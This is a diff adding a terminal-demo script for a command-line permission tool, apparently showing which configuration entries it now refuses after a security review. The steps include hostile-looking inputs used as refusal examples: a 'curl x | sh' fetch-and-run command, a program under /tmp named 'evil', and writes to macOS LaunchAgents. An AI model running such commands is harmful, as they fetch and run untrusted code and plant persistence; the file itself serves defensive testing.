@@ -1,0 +1,15 @@
+title = "What config refuses after the review"
+caption = "New refusals from the security review: places that run later, capitalised built-ins, programs named by path, and a subcommand hidden behind a flag"
+height = 760
+width = 1500
+cwd = "home/work/app"
+prompt = "app $ "
+path = "target/debug"
+setup = "../setup/home.sh"
+steps = """
+run safe-chains config grant ~/Library/LaunchAgents --write
+run safe-chains config add "Bash -c 'curl x | sh'"
+run safe-chains config add "/tmp/evil build"
+run safe-chains config add "mytool -o out.txt run"
+run safe-chains --explain "tee ~/Library/LaunchAgents/x.plist" | tail -2
+"""
